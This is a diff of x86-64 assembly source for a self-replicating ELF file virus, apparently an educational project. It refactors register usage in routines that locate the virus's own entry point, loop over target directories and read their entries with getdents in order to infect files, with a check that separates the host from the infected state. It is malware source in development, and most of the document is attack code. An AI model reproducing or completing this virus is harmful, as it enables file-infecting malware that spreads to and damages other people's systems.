@@ -15,6 +15,9 @@ section.text:
 ;and
 ;xor x, x => 3 bytes (put 0 into x)
 
+; function parameters are always (rdi, rsi, rdx) in this specific order
+; (make sense with syscall)
+
 _start:
 	call _inject; push addr to stack
 %ifdef DEBUG; ==================================================================
@@ -22,19 +25,21 @@ _start:
 
 newline db `\n`, 0x0
 
-_ft_strlen:; (string rsi)
-	xor rax, rax; = 0
-	_count_char:
-		cmp byte [rsi + rax], 0
-		jz _end_count_char
-		inc rax
-		jmp _count_char
-	_end_count_char:
+_ft_strlen:; (string rdi) - use rcx, rsi
+	xor rcx, rcx; = 0
+	.count_char:
+		cmp byte [rdi + rcx], 0
+		jz .return
+		inc rcx
+		jmp .count_char
+	.return:
 ret
 
-_print:; (string rsi)
+_print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, r15(temp)
 	call _ft_strlen
-	push rax; mov rdx, rax
+	push rdi; mov rsi, rdi
+	pop rsi
+	push rcx; mov rdx, rcx
 	pop rdx
 	push 1; mov rax, 1
 	pop rax; write
@@ -43,53 +48,53 @@ _print:; (string rsi)
 	syscall
 
 	push rsi
+	pop r15
 	lea rsi, [rel newline]
 	push 1
 	pop rax; write
 	push 1
 	pop rdx
 	syscall
-	pop rsi
+	push r15
+	pop rdi
 ret
 
 %endif; ========================================================================
 
 _inject:
-	pop rsi; pop addr from stack
+	pop rdi; pop addr from stack
 	push rdx; save register
-%ifdef DEBUG
-	call _print
-%endif
-	sub rsi, 0x5; sub call instr
-	push rsi; mov r8, rsi
+	%ifdef DEBUG
+		call _print; _print(rdi)
+	%endif
+	sub rdi, 0x5; sub call instr
+	push rdi; mov r8, rsi
 	pop r8
 ; r8 contains the entry of the virus
 
-	lea rsi, [rel directories]
+	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
-	_loop_dir:
-		add rsi, rcx
+	.loop_dir:
+		add rdi, rcx
 		call _infect_dir
 		xor rcx, rcx; = 0
-		_seek_next_string:; seek next dir
+		.next_dir:; seek next dir
 			inc rcx
-			cmp byte[rsi + rcx], 0x0
-			jnz _seek_next_string
+			cmp byte[rdi + rcx], 0x0
+			jnz .next_dir
 		inc rcx
-		cmp byte[rsi + rcx], 0x0
-		jnz _loop_dir
+		cmp byte[rdi + rcx], 0x0
+		jnz .loop_dir
 
 	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jnz _infected
 	jmp _host
 
-_infect_dir:; (string rsi)
-%ifdef DEBUG
-	call _print
-%endif
-	push rsi
-	pop rdi
+_infect_dir:; (string rdi)
+	%ifdef DEBUG
+		call _print; _print(rdi)
+	%endif
 	sub rsp, 1024; buffer of 1024 on stack
 	push 2
 	pop rax; open
@@ -97,66 +102,66 @@ _infect_dir:; (string rsi)
 	pop rsi
 	syscall
 	cmp rax, 0x0
-	jl _end_infect_dir; jump lower
+	jl .return; jump lower
 
 	push rdi
 	pop r10; path
 	push rax
 	pop rdi; fd
+	mov r11, rdi; save fd
 
-	_getdents:
-	push 78
-	pop rax; getdents
-	push 1024
-	pop rdx; size of buffer
-	mov rsi, rsp; buffer
-	syscall
-	cmp rax, 0x0
-	jle _end_getdents
-	push rax
-	pop rdx; nread
-	push rsi
-	pop rax
-	xor rcx, rcx; = 0
-	_loop_in_dir:
-	cmp rcx, rdx
-	jg _end_loop_in_dir; rcx > rdx
-	mov rsi, rax
-	add rsi, rcx; rax => linux_dir
-; if not . .. + 10
-	add rsi, 18
-%ifdef DEBUG
-	push rax
-	push rdi
-	push rdx
-	push rcx
-	call _print
-	pop rcx
-	pop rdx
-	pop rdi
-	pop rax
-%endif
+	.getdents:
+		push 78
+		pop rax; getdents
+		push 1024
+		pop rdx; size of buffer
+		mov rsi, rsp; buffer
+		syscall
+		push rsi
+		pop r12
+		cmp rax, 0x0
+		jle .close
+		push rax
+		pop rdx; nread
+		xor rcx, rcx; = 0
 
-	mov rsi, rax
-	add rsi, 16
-	add rcx, [rsi]
-	jmp _loop_in_dir
-	_end_loop_in_dir:
-	push rax
-	pop rsi
-	jmp _getdents
-	_end_getdents:
-	push 3
-	pop rax; close
-	syscall
+	.loop_in_dir:
+		cmp rcx, rdx
+		jge .getdents; rcx >= rdx
+		mov rdi, r12
+		add rdi, rcx; r12 => linux_dir
+		; if not . .. +18
+		add rdi, 18; linux_dir->d_name
+		%ifdef DEBUG
+			push rsi
+			push rdx
+			push rcx
+			call _print; _print(rdi)
+			pop rcx
+			pop rdx
+			pop rsi
+		%endif
 
-	push r10
-	pop rdi
+		mov rsi, r12
+		add rsi, rcx
+		push rdi
+		movzx edi, word [rsi + 16]; linux_dir->d_reclen
+		add rcx, rdi
+		pop rdi
+		jmp .loop_in_dir
 
-	_end_infect_dir:
-	add rsp, 1024
-	push rdi
-	pop rsi
+	.close:
+		push 3
+		pop rax; close
+		syscall
+
+		push r10
+		pop rdi
+
+	.return:
+		add rsp, 1024
+		push rdi
+		pop rsi
 ret
 
 _host:
